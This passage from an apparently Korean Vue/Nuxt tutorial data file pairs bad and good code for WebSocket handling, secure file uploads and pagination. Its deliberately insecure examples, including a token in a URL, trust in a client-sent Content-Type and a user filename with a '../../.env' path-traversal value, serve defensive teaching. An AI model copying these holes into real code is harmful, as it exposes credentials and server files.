// Nitro: server/routes/ws.ts 에서 defineWebSocketHandler (nitro.experimental.websocket = true)
`,
        },
        {
          id: 'l2', short: `연결은 하나`,
          title: `컴포넌트마다 연결하지 않는다. 앱에 하나, 구독만 나눈다`,
          why: `알림 센터, 헤더 배지, 채팅 페이지가 각자 WebSocket 을 열면 탭 하나에 연결 3개, 서버는 사용자 수 × 3 입니다. 연결은 플러그인·전역 컴포저블이 하나 들고, 컴포넌트는 토픽을 구독하고 언마운트 때 해제합니다.`,
          bad: String.raw`
// components/NotificationBadge.vue
onMounted(() => { ws = new WebSocket(url) ... })
// components/NotificationCenter.vue
onMounted(() => { ws = new WebSocket(url) ... })     // 같은 사용자에게 연결 2개
`,
          good: String.raw`
// composables/useRealtime.ts — 모듈 전역 싱글턴 (클라이언트 전용)
let socket: ReconnectingSocket | null = null
const listeners = new Map<string, Set<(data: any) => void>>()

export function useRealtime() {
  if (import.meta.client) socket ??= createSocket({ onMessage: (msg) => listeners.get(msg.type)?.forEach((fn) => fn(msg.data)) })
  function on<T>(type: string, fn: (data: T) => void) {
    (listeners.get(type) ?? listeners.set(type, new Set()).get(type)!).add(fn)
    onScopeDispose(() => listeners.get(type)?.delete(fn))             // 컴포넌트가 사라지면 구독도
  }
  return { on, send: (type: string, data?: unknown) => socket?.send(JSON.stringify({ type, data })), status: socket?.status }
}
// 사용: const rt = useRealtime(); rt.on<Noti>('notification', (n) => list.value.unshift(n))
// 탭 여러 개면 BroadcastChannel 로 한 탭만 연결하고 나머지에 전달하는 것도 가능 (실무 코드 1회차 09번)
`,
        },
        {
          id: 'l3', short: `재연결`,
          title: `끊김은 정상이다. 지수 백오프 + 지터로 다시 붙고, 수동 종료와 구분한다`,
          why: `모바일은 네트워크가 수시로 바뀌고 서버는 배포로 재시작합니다. 바로 재시도하면 서버가 살아날 때 수만 개가 한꺼번에 붙습니다(썬더링 허드). 1초, 2초, 4초… 최대 30초에 무작위를 섞고, 사용자가 닫은 경우는 재시도하지 않습니다.`,
          bad: String.raw`
ws.onclose = () => connect()                          // 즉시, 무한, 수동 close 도 다시 붙는다
`,
          good: String.raw`
function createSocket(url: string) {
  let ws: WebSocket | null = null, attempt = 0, closedByUser = false
  const status = ref<'connecting' | 'open' | 'closed'>('connecting')

  function connect() {
    status.value = 'connecting'
    ws = new WebSocket(url)
    ws.onopen = () => { attempt = 0; status.value = 'open'; onOpen() }   // 05번: 재동기화
    ws.onclose = (e) => {
      status.value = 'closed'
      if (closedByUser || e.code === 4001) return                  // 4001: 서버가 "인증 만료, 다시 오지 마" 같은 의도적 종료 코드
      const delay = Math.min(30_000, 1000 * 2 ** attempt++) * (0.5 + Math.random())   // 백오프 + 지터
      setTimeout(connect, delay)
    }
    ws.onerror = () => ws?.close()                                 // error 뒤엔 close 가 온다. 여기서 재시도하지 않는다
  }
  function close() { closedByUser = true; ws?.close(1000) }
  if (navigator.onLine) connect()
  window.addEventListener('online', () => status.value === 'closed' && !closedByUser && (attempt = 0, connect()))   // 네트워크 복구 즉시
  return { status, close, send: (s: string) => ws?.readyState === 1 && ws.send(s) }
}
`,
        },
        {
          id: 'l4', short: `하트비트`,
          title: `죽은 연결을 알아채려면 ping/pong 이 필요하다`,
          why: `와이파이가 끊겨도 TCP 는 몇 분 동안 "열림" 으로 보입니다. 그동안 메시지는 사라지고 onclose 는 안 옵니다. 30초마다 ping 을 보내고 pong 이 안 오면 끊고 재연결합니다. 서버도 같은 이유로 idle 연결을 정리합니다.`,
          bad: String.raw`
// 연결만 하고 영원히 기다린다. 사용자는 "알림이 안 와요", 새로고침하면 된다
`,
          good: String.raw`
let pingTimer: ReturnType<typeof setInterval>, pongTimeout: ReturnType<typeof setTimeout>
ws.onopen = () => {
  pingTimer = setInterval(() => {
    ws.send('{"type":"ping"}')
    pongTimeout = setTimeout(() => ws.close(4000, 'pong timeout'), 10_000)   // 10초 안에 pong 없으면 끊는다 → onclose → 재연결
  }, 30_000)
}
ws.onmessage = (e) => { const msg = JSON.parse(e.data); if (msg.type === 'pong') return clearTimeout(pongTimeout); dispatch(msg) }
ws.onclose = () => { clearInterval(pingTimer); clearTimeout(pongTimeout); ... }

// 탭이 숨겨지면 타이머가 느려진다: visibilitychange 로 돌아왔을 때 즉시 ping 한 번
// SSE 는 서버가 15~30초마다 ": keepalive\n\n" 주석 줄을 보내 프록시 타임아웃을 막는다. 브라우저 재연결은 EventSource 가 한다
`,
        },
        {
          id: 'l5', short: `재연결 후 동기화`,
          title: `끊긴 동안 놓친 것은 "다시 받기" 로 메운다. 밀린 메시지를 기대하지 않는다`,
          why: `30초 끊겼다 붙으면 그 사이 메시지는 없습니다. 실시간 채널은 "변했다는 신호" 이고 진실은 서버 상태입니다. onopen 에서 마지막으로 받은 id 이후를 요청하거나(SSE Last-Event-ID), 간단히 목록을 다시 받습니다.`,
          bad: String.raw`
// onopen 에서 아무것도 안 한다. 끊긴 동안 온 채팅 10개는 영원히 안 보인다
`,
          good: String.raw`
let lastId: string | null = null
function onOpen() {
  if (lastId) send('resync', { since: lastId })          // 서버: since 이후 이벤트를 순서대로 재전송 (또는 REST 로 GET /messages?after=lastId)
  else refreshNuxtData('messages')                       // 첫 연결이거나 기준이 없으면 통째로
}
function dispatch(msg) { if (msg.id) lastId = msg.id; ... }

// SSE 는 내장: 서버가 각 이벤트에 id: 를 붙이면 브라우저가 재연결 시 Last-Event-ID 헤더를 보낸다
// server: const stream = createEventStream(event); const since = getHeader(event, 'last-event-id'); for (const e of await eventsAfter(since)) stream.push({ id: e.id, data: JSON.stringify(e) })

// 화면 쪽: 재연결 중임을 알린다 — <p v-if="status !== 'open'" role="status">연결 중…</p>. 보내기 버튼은 비활성이 아니라 큐에 넣고 연결되면 보낸다 (실무 코드 7회차 07번)
`,
        },
        {
          id: 'l6', short: `메시지 모양`,
          title: `모든 메시지는 { type, data } 봉투에 담고, 타입별 스키마로 판별한다`,
          why: `문자열을 보고 if 로 나누면 메시지 종류가 10개가 되면서 무너집니다. 타입 필드를 두고 스키마(zod) 로 검증한 뒤 핸들러 표에 넘깁니다. 모르는 타입은 무시하되 로그로 남겨 서버·클라이언트 버전 차이를 알아챕니다.`,
          bad: String.raw`
ws.onmessage = (e) => {
  if (e.data.startsWith('msg:')) addMessage(e.data.slice(4))
  else if (e.data.includes('typing')) ...
}
`,
          good: String.raw`
// shared/realtime.ts — 서버·클라이언트 공용
import { z } from 'zod'
export const Envelope = z.discriminatedUnion('type', [
  z.object({ type: z.literal('message'), id: z.string(), data: z.object({ roomId: z.string(), text: z.string(), authorId: z.string(), at: z.string() }) }),
  z.object({ type: z.literal('typing'), data: z.object({ roomId: z.string(), userId: z.string() }) }),
  z.object({ type: z.literal('presence'), data: z.object({ online: z.array(z.string()) }) }),
  z.object({ type: z.literal('pong') })
])
export type Envelope = z.infer<typeof Envelope>

// 클라이언트
const handlers: { [K in Envelope['type']]?: (m: Extract<Envelope, { type: K }>) => void } = {
  message: (m) => chat.add(m.data), typing: (m) => chat.typing(m.data.userId), presence: (m) => chat.setOnline(m.data.online)
}
ws.onmessage = (e) => {
  const r = Envelope.safeParse(JSON.parse(e.data))
  if (!r.success) return console.warn('[ws] unknown message', e.data.slice(0, 100))
  handlers[r.data.type]?.(r.data as any)
}
`,
        },
        {
          id: 'l7', short: `렌더 묶기`,
          title: `초당 수십 개 메시지는 받는 즉시 그리지 않고 프레임 단위로 묶는다`,
          why: `가격 틱 50개/초를 하나하나 ref 에 넣으면 초당 50번 리렌더됩니다. 버퍼에 모았다가 requestAnimationFrame 한 번에 반영하면 화면은 같고 비용은 1/3 입니다. 대량 목록은 shallowRef 로 반응성 비용도 줄입니다.`,
          bad: String.raw`
rt.on('tick', (t) => { prices.value[t.symbol] = t.price })   // 틱마다 반응성 트리거, 틱마다 렌더
`,
          good: String.raw`
const prices = shallowRef<Record<string, number>>({})
const buffer: Tick[] = []
let scheduled = false
rt.on<Tick>('tick', (t) => {
  buffer.push(t)
  if (scheduled) return
  scheduled = true
  requestAnimationFrame(() => {
    const next = { ...prices.value }
    for (const b of buffer) next[b.symbol] = b.price                  // 같은 심볼은 마지막 값만 남는다
    buffer.length = 0; scheduled = false
    prices.value = next                                               // 한 번만 트리거
  })
})
// 탭이 숨겨져 있으면 rAF 가 멈춘다 → 버퍼가 무한히 쌓이지 않게 상한(예: 1,000) 을 두고 오래된 것부터 버리거나, 숨김 중엔 구독 해제 (10번)
`,
        },
        {
          id: 'l8', short: `인증`,
          title: `WebSocket 은 헤더를 못 보낸다. 쿠키나 1회용 티켓으로 인증한다`,
          why: `브라우저 WebSocket API 에는 Authorization 헤더가 없습니다. URL 쿼리에 액세스 토큰을 넣으면 로그와 히스토리에 남습니다. 같은 도메인이면 쿠키가 자동으로 가고, 아니면 짧게 사는 티켓을 REST 로 받아 첫 메시지로 보냅니다.`,
          bad: String.raw`
new WebSocket('wss://api.example.com/ws?token=' + accessToken)    // 서버 로그, 프록시 로그에 토큰이 남는다
`,
          good: String.raw`
// 같은 도메인 (또는 서브도메인 쿠키): 쿠키가 핸드셰이크에 자동으로 실린다. 서버는 upgrade 핸들러에서 쿠키로 사용자 확인
// Nitro: defineWebSocketHandler({ upgrade(req) { const user = await userFromCookie(req.headers.cookie); if (!user) throw createError({ statusCode: 401 }) }, open(peer) { ... } })

// 다른 도메인: 1회용 티켓
const { ticket } = await $api<{ ticket: string }>('/api/ws/ticket', { method: 'POST' })   // 30초 유효, 1회
const ws = new WebSocket('wss://rt.example.com/ws')
ws.onopen = () => ws.send(JSON.stringify({ type: 'auth', data: { ticket } }))             // 첫 메시지로 인증. 서버는 5초 안에 auth 없으면 끊는다
// 토큰 만료: 서버가 close(4001) → 클라이언트는 재발급(1회차) 후 새 티켓으로 재연결. 03번에서 4001 은 자동 재시도 제외
`,
        },
        {
          id: 'l9', short: `서버 쪽 방`,
          title: `브로드캐스트는 방(room) 단위로, 사용자 ↔ 연결은 다대다로 관리한다`,
          why: `모든 연결에 모든 메시지를 보내면 사용자 수의 제곱으로 늘어납니다. 채팅방·주문·문서 단위의 방에 연결을 넣고 그 방에만 보냅니다. 한 사용자가 탭 3개면 연결 3개이므로 "사용자에게 보내기" 는 그 사용자의 연결 전부입니다. 서버가 여러 대면 Redis pub/sub 로 잇습니다.`,
          bad: String.raw`
const peers = new Set<Peer>()
open(peer) { peers.add(peer) }
message(peer, msg) { for (const p of peers) p.send(msg) }   // 전부에게
`,
          good: String.raw`
// server/routes/ws.ts (Nitro, crossws)
export default defineWebSocketHandler({
  async upgrade(req) { req.context.user = await userFromCookie(req.headers.get('cookie')) },
  open(peer) { peer.subscribe('user:' + peer.context.user.id) },             // 사용자 채널: 알림용
  message(peer, raw) {
    const msg = Envelope.parse(JSON.parse(raw.text()))
    if (msg.type === 'join') { if (await canJoin(peer.context.user, msg.data.roomId)) peer.subscribe('room:' + msg.data.roomId) }   // 권한 검사 후 방 구독
    if (msg.type === 'message') { const saved = await saveMessage(msg.data, peer.context.user); peer.publish('room:' + msg.data.roomId, JSON.stringify({ type: 'message', ...saved })); peer.send(JSON.stringify({ type: 'ack', id: msg.data.clientId, serverId: saved.id })) }
  },
  close(peer) { /* 구독은 자동 해제. presence 갱신 */ }
})
// 다른 곳(결제 승인 핸들러) 에서 특정 사용자에게: 실무 코드 15회차 publishSSE 처럼 pub/sub 어댑터로 → nitro.websocket.adapter 'redis' 면 여러 인스턴스에 전파
`,
        },
        {
          id: 'l10', short: `탭과 배터리`,
          title: `탭이 숨겨지면 구독을 줄이거나 끊고, 돌아오면 다시 맞춘다`,
          why: `백그라운드 탭 20개가 각자 실시간 연결을 유지하면 서버와 배터리가 낭비됩니다. 숨겨진 동안은 저빈도 토픽(가격 틱) 구독을 해제하거나 아예 끊고, 돌아오면 05번처럼 재동기화합니다. 알림처럼 꼭 받아야 하는 건 SSE 하나만 남깁니다.`,
          bad: String.raw`
// 탭 상태와 무관하게 틱 50개/초를 계속 받고 버퍼에 쌓는다
`,
          good: String.raw`
const visible = useDocumentVisibility()
watch(visible, (v) => {
  if (v === 'hidden') { rt.send('unsubscribe', { topic: 'ticks' }); hiddenAt = Date.now() }
  else {
    rt.send('subscribe', { topic: 'ticks' })
    if (Date.now() - hiddenAt > 60_000) refreshNuxtData('prices')     // 오래 비웠으면 통째로 다시
  }
})
// 더 공격적으로: 숨겨진 지 5분이 지나면 socket.close(), 돌아오면 connect() (03번 closedByUser 플래그를 써서 자동 재시도와 구분)
// 서버도 방어: 같은 사용자 연결 상한(예: 5), idle 10분이면 끊기
`,
        },
      ],
    },
    {
      id: 'vue-25', no: 25, name: `파일 업로드와 이미지 처리`,
      lead: `파일을 안전하고 빠르게 받는 습관입니다. 검증은 양쪽에서, 큰 파일은 서버를 거치지 않고, 이미지는 올리기 전에 줄이고, 진행률과 취소를 주고, 저장 뒤에는 최적화해서 보여 줍니다.`,
      lessons: [
        {
          id: 'l1', short: `타입 검증`,
          title: `accept 는 편의이고, 검증은 서버가 파일 내용으로 한다`,
          why: `accept="image/*" 는 파일 선택창의 필터일 뿐이고, file.type 은 확장자로 추측한 값이라 조작됩니다. 서버가 매직 바이트로 실제 형식을 확인하고 허용 목록과 대조해야 .jpg 로 위장한 HTML·스크립트를 막습니다.`,
          bad: String.raw`
<input type="file" accept="image/*" @change="upload">
// server: if (!file.type.startsWith('image/')) throw ...   // 클라이언트가 보낸 Content-Type 을 믿는다
`,
          good: String.raw`
<!-- 클라이언트: 빠른 피드백용 -->
<input type="file" accept="image/jpeg,image/png,image/webp" @change="onPick">
<script setup lang="ts">
const ALLOWED = ['image/jpeg', 'image/png', 'image/webp']
function onPick(e: Event) {
  const file = (e.target as HTMLInputElement).files?.[0]; if (!file) return
  if (!ALLOWED.includes(file.type)) return toast.error('JPG, PNG, WebP 만 올릴 수 있습니다')
  upload(file)
}
</script>

// 서버: 내용으로 판별
import { fileTypeFromBuffer } from 'file-type'
const detected = await fileTypeFromBuffer(buffer)                           // 매직 바이트
if (!detected || !ALLOWED.includes(detected.mime)) throw createError({ statusCode: 415, statusMessage: '지원하지 않는 파일 형식입니다' })
// 저장할 확장자도 detected.ext 로 정한다. 사용자가 준 파일명의 확장자는 쓰지 않는다 (10번)
// SVG 는 스크립트를 품을 수 있다: 이미지로 허용하려면 sanitize(DOMPurify) 하거나 raster 로 변환
`,
        },
        {
          id: 'l2', short: `크기 제한`,
          title: `크기 제한은 선택 직후, 서버 핸들러, 프록시 세 곳에 둔다`,
          why: `100MB 를 다 올린 뒤에 "10MB 이하만" 이라고 하면 사용자는 화가 납니다. 선택 즉시 막고, 서버도 본문을 다 읽기 전에 Content-Length 로 거르고, 프록시(nginx client_max_body_size) 도 막아야 메모리 공격을 받지 않습니다.`,
          bad: String.raw`
// 서버에서 전부 읽은 뒤
const body = await readMultipartFormData(event)
if (body[0].data.length > 10 * 1024 * 1024) throw createError({ statusCode: 413 })   // 이미 메모리에 100MB
`,
          good: String.raw`
// 1) 클라이언트: 선택 즉시
const MAX = 10 * 1024 * 1024
if (file.size > MAX) return toast.error('10MB 이하만 올릴 수 있습니다 (' + (file.size / 1048576).toFixed(1) + 'MB)')

// 2) 서버: 읽기 전에 헤더로
const len = Number(getHeader(event, 'content-length') ?? 0)
if (len > MAX + 1024) throw createError({ statusCode: 413, statusMessage: '파일이 너무 큽니다' })
// 그리고 스트리밍으로 받으면서 누적 크기 초과 시 끊기 (busboy / @fastify/multipart limits)

// 3) 프록시
// nginx: client_max_body_size 12m;   Vercel/Netlify 함수는 4.5~6MB 본문 제한 → 큰 파일은 06번 presigned 직접 업로드
`,
        },
        {
          id: 'l3', short: `리사이즈`,
          title: `사진은 올리기 전에 브라우저에서 줄인다`,
          why: `폰 사진은 4~12MB 인데 화면에는 1600px 이면 충분합니다. 캔버스로 줄이면 업로드가 10배 빨라지고 서버 저장소도 줍니다. 원본이 필요한 경우(인쇄, 증빙) 만 예외입니다. EXIF 회전은 createImageBitmap 이 처리합니다.`,
          bad: String.raw`
await upload(file)      // 12MB 원본을 그대로. 3G 에서 2분
`,
          good: String.raw`
export async function resizeImage(file: File, { maxWidth = 1600, quality = 0.85, type = 'image/webp' } = {}): Promise<File> {
  if (!file.type.startsWith('image/') || file.type === 'image/gif') return file                 // GIF 는 애니메이션이 깨진다
  const bmp = await createImageBitmap(file, { imageOrientation: 'from-image' })                  // EXIF 회전 반영
  const scale = Math.min(1, maxWidth / Math.max(bmp.width, bmp.height))
  if (scale === 1 && file.size < 500 * 1024) { bmp.close(); return file }                      // 이미 작으면 그대로
  const canvas = new OffscreenCanvas(Math.round(bmp.width * scale), Math.round(bmp.height * scale))
  canvas.getContext('2d')!.drawImage(bmp, 0, 0, canvas.width, canvas.height); bmp.close()
  const blob = await canvas.convertToBlob({ type, quality })
  return new File([blob], file.name.replace(/\.\w+$/, '') + '.webp', { type })
}
// 캔버스를 거치면 EXIF(위치 정보 포함) 가 사라진다 — 개인정보 측면에서도 좋다 (09번)
// 워커에서 돌리면 UI 가 안 멈춘다: OffscreenCanvas 는 워커에서도 된다
`,
        },
        {
          id: 'l4', short: `진행률과 취소`,
          title: `1초 넘는 업로드에는 진행률과 취소 버튼이 있다`,
          why: `fetch 는 업로드 진행률 이벤트가 없습니다. XMLHttpRequest 의 upload.onprogress 를 쓰거나 axios 의 onUploadProgress 를 씁니다. 취소는 AbortController 로, 취소된 업로드는 서버에서도 파일이 남지 않게 합니다.`,
          bad: String.raw`
await fetch('/api/upload', { method: 'POST', body: form })   // 진행률 없음, 취소 없음, 사용자는 멈춘 줄 안다
`,
          good: String.raw`
export function uploadWithProgress(url: string, file: File, onProgress: (p: number) => void, signal?: AbortSignal) {
  return new Promise<any>((resolve, reject) => {
    const xhr = new XMLHttpRequest()
    xhr.open('PUT', url)
    xhr.upload.onprogress = (e) => e.lengthComputable && onProgress(Math.round((e.loaded / e.total) * 100))
    xhr.onload = () => (xhr.status < 300 ? resolve(xhr.response) : reject(new Error('upload failed ' + xhr.status)))
    xhr.onerror = () => reject(new Error('network'))
    signal?.addEventListener('abort', () => { xhr.abort(); reject(new DOMException('aborted', 'AbortError')) })
    xhr.send(file)
  })
}
// axios 면: axios.put(url, file, { onUploadProgress: (e) => ..., signal })

<progress :value="progress" max="100" :aria-label="file.name + ' 업로드'" />
<button @click="controller.abort()">취소</button>
// 여러 파일은 동시 2~3개로 제한한 큐 (실무 코드 6회차 03번). 전부 동시에 쏘면 느린 회선에서 전부 타임아웃
`,
        },
        {
          id: 'l5', short: `미리보기`,
          title: `미리보기는 createObjectURL, 다 쓰면 revoke 한다`,
          why: `FileReader 로 data URL 을 만들면 파일 크기의 1.3배 문자열이 메모리에 생기고 템플릿에 박힙니다. createObjectURL 은 즉시 끝나고 가볍지만, 해제하지 않으면 탭이 닫힐 때까지 메모리를 잡습니다. 컴포넌트가 사라지거나 파일이 바뀌면 revoke.`,
          bad: String.raw`
const reader = new FileReader()
reader.onload = () => (preview.value = reader.result as string)   // 12MB 사진 → 16MB 문자열
reader.readAsDataURL(file)
`,
          good: String.raw`
// composables/useObjectUrl.ts (VueUse 의 useObjectUrl 과 같은 것)
export function useObjectUrl(file: Ref<File | Blob | null>) {
  const url = ref<string | null>(null)
  watch(file, (f) => {
    if (url.value) URL.revokeObjectURL(url.value)
    url.value = f ? URL.createObjectURL(f) : null
  }, { immediate: true })
  onScopeDispose(() => url.value && URL.revokeObjectURL(url.value))
  return url
}
const preview = useObjectUrl(selectedFile)
<img v-if="preview" :src="preview" alt="선택한 이미지 미리보기">
// 업로드가 끝나 서버 URL 로 바꾼 뒤에도 revoke 된다 (file 을 null 로)
`,
        },
        {
          id: 'l6', short: `직접 업로드`,
          title: `큰 파일은 우리 서버를 거치지 않고 스토리지에 바로 올린다`,
          why: `서버가 파일을 받아 다시 S3 에 올리면 대역폭·메모리·시간이 두 배이고 서버리스 본문 제한에 걸립니다. 서버는 서명된 URL 만 발급하고 브라우저가 스토리지에 직접 PUT 합니다. 완료 후 서버에 "올렸다" 고 알려 DB 에 기록합니다.`,
          bad: String.raw`
// 브라우저 → 우리 서버(multipart 파싱, 메모리) → S3. 100MB 동영상이면 서버가 죽는다
`,
          good: String.raw`
// 1) server/api/uploads/presign.post.ts — 서명만. 키는 서버가 정한다 (10번)
export default defineEventHandler(async (event) => {
  const user = await requireUser(event)
  const { name, type, size } = z.object({ name: z.string(), type: z.enum(ALLOWED), size: z.number().max(MAX) }).parse(await readBody(event))
  const key = 'u/' + user.id + '/' + randomUUID() + '.' + extFor(type)
  const url = await getSignedUrl(s3, new PutObjectCommand({ Bucket, Key: key, ContentType: type, ContentLength: size }), { expiresIn: 300 })
  return { url, key }
})
// 2) 브라우저: 04번 uploadWithProgress(url, file, ...)  — Content-Type 헤더를 서명과 같게
// 3) server/api/uploads/complete.post.ts — HeadObject 로 실제 존재·크기 확인 후 DB 기록. 24시간 안에 complete 가 없는 키는 정리 작업이 삭제
// 버킷 CORS: AllowedMethods PUT, AllowedOrigins 우리 도메인, ExposeHeaders ETag
// 100MB 넘으면 멀티파트 업로드(5MB 조각, 병렬, 재개) — @aws-sdk/lib-storage 또는 Uppy 의 AwsS3Multipart
`,
        },
        {
          id: 'l7', short: `보여 주기`,
          title: `저장한 원본을 그대로 쓰지 않고, 보여 줄 크기로 변환해서 보여 준다`,
          why: `업로드된 2000px 이미지를 목록 썸네일 80px 에 그대로 쓰면 목록 하나에 20MB 입니다. 이미지 변환 서비스(ipx, Cloudinary, imgproxy, CloudFront 함수) 를 앞에 두고 NuxtImg 로 크기·포맷을 지정합니다. 원본은 저장소에만.`,
          bad: String.raw`
<img v-for="p in products" :src="p.imageUrl" class="thumb">   <!-- 원본 URL 을 썸네일에 -->
`,
          good: String.raw`
// nuxt.config.ts
image: { provider: 'ipx', domains: ['uploads.example.com'], presets: { thumb: { modifiers: { width: 160, height: 160, fit: 'cover', format: 'webp' } } } }
// 또는 CDN 변환: provider: 'cloudinary' | 'imgproxy' | 'cloudflare' ...

<NuxtImg v-for="p in products" :key="p.id" :src="p.imageUrl" preset="thumb" :alt="p.name" loading="lazy" />
<!-- 상세: sizes 로 반응형 (23회차 02번) -->

// 변환 결과는 CDN 캐시. 원본 교체 시 URL 이 같으면 캐시가 남는다 → 파일 키에 UUID 를 쓰고 교체는 새 키로 (10번)
// 사용자 아바타처럼 작은 고정 크기는 업로드 완료 시점에 서버가 미리 변환해 두는 것도 좋다 (sharp)
`,
        },
        {
          id: 'l8', short: `드롭과 붙여넣기`,
          title: `드롭존은 input 을 숨긴 label 위에 얹고, 붙여넣기도 같은 경로로 받는다`,
          why: `드래그 앤 드롭만 되는 영역은 키보드·스크린리더 사용자가 쓸 수 없습니다. 진짜 input[type=file] 을 label 로 감싸고 드롭·붙여넣기 이벤트는 같은 처리 함수로 보냅니다. dragover 에 preventDefault 가 없으면 브라우저가 파일을 열어 버립니다.`,
          bad: String.raw`
<div class="dropzone" @drop="onDrop">여기에 끌어다 놓으세요</div>   <!-- 클릭도 키보드도 안 됨, dragover 미처리 -->
`,
          good: String.raw`
<label class="dropzone" :class="{ over }" @dragover.prevent="over = true" @dragleave="over = false" @drop.prevent="over = false; addFiles($event.dataTransfer?.files)">
  <input type="file" multiple accept="image/jpeg,image/png,image/webp" class="sr-only" @change="addFiles(($event.target as HTMLInputElement).files); ($event.target as HTMLInputElement).value = ''">
  <IconUpload aria-hidden="true" />
  <span>끌어다 놓거나 <u>클릭해서 선택</u></span>
  <span class="tiny muted">JPG, PNG, WebP · 10MB 이하 · 최대 10장</span>
</label>
<script setup lang="ts">
function addFiles(list?: FileList | null) { for (const f of Array.from(list ?? [])) enqueue(f) }   // 01·02·03번 검증과 리사이즈 → 큐
useEventListener(document, 'paste', (e) => { const files = Array.from(e.clipboardData?.files ?? []); if (files.length) { e.preventDefault(); addFiles(files as any) } })
</script>
<!-- input.value = '' : 같은 파일을 다시 골라도 change 가 나게. 폴더 드롭은 webkitGetAsEntry 로 재귀 -->
`,
        },
        {
          id: 'l9', short: `개인정보`,
          title: `사진의 위치 정보(EXIF) 는 지우고, 비공개 파일은 서명 URL 로만 준다`,
          why: `폰 사진에는 GPS 좌표가 들어 있습니다. 프로필 사진으로 올린 원본을 그대로 공개하면 집 주소가 새어 나갑니다. 03번 캔버스 변환은 EXIF 를 지우지만 원본을 그대로 받는 경로가 있다면 서버에서 지웁니다. 증빙·계약서 같은 파일은 공개 URL 이 아니라 만료되는 서명 URL 로.`,
          bad: String.raw`
// 원본 그대로 공개 버킷에 → https://cdn.example.com/u/123/IMG_2031.jpg (GPS 포함, 누구나 접근)
`,
          good: String.raw`
// 서버: sharp 로 메타데이터 제거하며 저장 (rotate() 가 EXIF 방향을 적용한 뒤 버린다)
const clean = await sharp(buffer).rotate().withMetadata({ exif: {} }).toFormat('webp', { quality: 85 }).toBuffer()

// 비공개 파일: 버킷은 private, 조회는 서명 URL (짧은 만료) 또는 서버 프록시 + 권한 검사
// server/api/files/[id].get.ts
export default defineEventHandler(async (event) => {
  const user = await requireUser(event)
  const f = await db.file.findUnique({ where: { id: getRouterParam(event, 'id')! } })
  if (!f || !canRead(user, f)) throw createError({ statusCode: 404 })          // 403 대신 404: 존재 여부도 숨긴다
  return sendRedirect(event, await getSignedUrl(s3, new GetObjectCommand({ Bucket, Key: f.key }), { expiresIn: 60 }), 302)
})
// 삭제 요청(탈퇴) 시 DB 행만 지우지 말고 스토리지 객체도 지운다 → file 테이블에 key 를 두고 작업으로 정리
`,
        },
        {
          id: 'l10', short: `파일명과 경로`,
          title: `저장 키는 서버가 만들고, 사용자 파일명은 표시용으로만 따로 저장한다`,
          why: `사용자 파일명을 경로에 쓰면 ../ 로 다른 폴더에 쓰거나, 한글·공백·특수문자로 URL 이 깨지거나, 같은 이름이 덮어씁니다. 키는 UUID 로 서버가 정하고, 원래 이름은 DB 의 displayName 에 두고 다운로드 때 Content-Disposition 으로 돌려줍니다.`,
          bad: String.raw`
const path = 'uploads/' + file.filename                     // "../../.env" , "내 사진 (1).JPG", 덮어쓰기
fs.writeFileSync(path, data)
`,
          good: String.raw`
const key = 'u/' + user.id + '/' + new Date().toISOString().slice(0, 7) + '/' + randomUUID() + '.' + detected.ext   // u/42/2026-03/5f1c….webp
await db.file.create({ data: { key, displayName: sanitizeName(file.filename), mime: detected.mime, size: buffer.length, ownerId: user.id } })

function sanitizeName(n: string) { return n.replace(/[\\/:*?"<>|\x00-\x1f]/g, '_').replace(/^\.+/, '').slice(0, 120) || 'file' }

// 다운로드: 원래 이름으로, 한글은 RFC 5987
setHeader(event, 'content-disposition', "attachment; filename*=UTF-8''" + encodeURIComponent(f.displayName))
// 실행 가능한 형식(.html .svg .js) 은 attachment 로만 내려보내고, 업로드 도메인은 앱 도메인과 분리 (uploads.example.com) 해 쿠키·스크립트 실행을 격리
`,
        },
      ],
    },
    {
      id: 'vue-26', no: 26, name: `데이터 테이블과 페이지네이션 패턴`,
      lead: `목록 화면을 흔들리지 않게 만드는 습관입니다. 페이지는 서버가, 정렬은 허용 목록으로, 상태는 URL 에, 선택은 id 로, 로딩 중에는 이전 데이터를 보여 주고, 큰 목록은 가상 스크롤로.`,
      lessons: [
        {
          id: 'l1', short: `서버 페이지네이션`,
          title: `전부 받아 클라이언트에서 자르지 않는다`,
          why: `"일단 다 받고 slice" 는 100건까지만 됩니다. 1만 건이면 응답이 수 MB 이고 첫 화면이 몇 초 걸립니다. 서버가 page·perPage 를 받아 그 페이지와 총 개수를 돌려주고, 클라이언트는 받은 것만 그립니다.`,
          bad: String.raw`
const { data: all } = await useFetch('/api/orders')           // 전부
const page = ref(1)
const rows = computed(() => all.value.slice((page.value - 1) * 20, page.value * 20))
`,
          good: String.raw`
const query = computed(() => ({ page: page.value, perPage: 20, sort: sort.value, dir: dir.value }))
const { data, status } = await useFetch('/api/orders', { query, watch: [query], default: () => ({ items: [], total: 0 }) })
// 응답: { items: Order[], total: 1234, page: 3, perPage: 20 }

// 서버
const page = Math.max(1, Number(q.page) || 1), perPage = Math.min(100, Number(q.perPage) || 20)   // 상한 필수
const [items, total] = await Promise.all([
  db.order.findMany({ where, orderBy, skip: (page - 1) * perPage, take: perPage }),
  db.order.count({ where })
])
`,
          note: `total 을 세는 count 가 느린 큰 테이블이면 "더 있음" 만 알려 주는 방식(take: perPage + 1) 이나 02번 커서를 씁니다.`,
        },
        {
          id: 'l2', short: `커서 vs 오프셋`,
          title: `페이지 번호 UI 는 오프셋, 무한 스크롤·실시간 목록은 커서`,
          why: `오프셋은 "3페이지로" 가 되지만 100만 건에서 skip 이 느리고, 새 행이 끼면 다음 페이지에 중복·누락이 생깁니다. 커서(마지막 행의 정렬 키) 는 빠르고 안정적이지만 임의 페이지로 못 갑니다. 화면이 요구하는 것에 맞춥니다.`,
          bad: String.raw`
// 무한 스크롤에 오프셋: 스크롤 중 새 주문이 들어오면 같은 행이 두 번 보인다
useFetch('/api/feed', { query: { page } })
`,
          good: String.raw`
// 커서: 정렬 키 + 고유 키 (createdAt 이 같을 수 있으니 id 를 같이)
// GET /api/feed?after=2026-03-05T10:00:00Z_abc123&limit=20
const [createdAt, id] = decodeCursor(q.after)
const items = await db.post.findMany({
  where: { OR: [{ createdAt: { lt: createdAt } }, { createdAt, id: { lt: id } }] },
  orderBy: [{ createdAt: 'desc' }, { id: 'desc' }], take: 21
})
const hasMore = items.length > 20
return { items: items.slice(0, 20), nextCursor: hasMore ? encodeCursor(items[19]) : null }

// 클라이언트: 실무 코드 4회차 02번 무한 스크롤. nextCursor 가 null 이면 끝
// 관리자 테이블처럼 "총 1,234건, 62페이지" 가 필요하면 오프셋 (01번)
`,
        },
        {
          id: 'l3', short: `정렬 화이트리스트`,
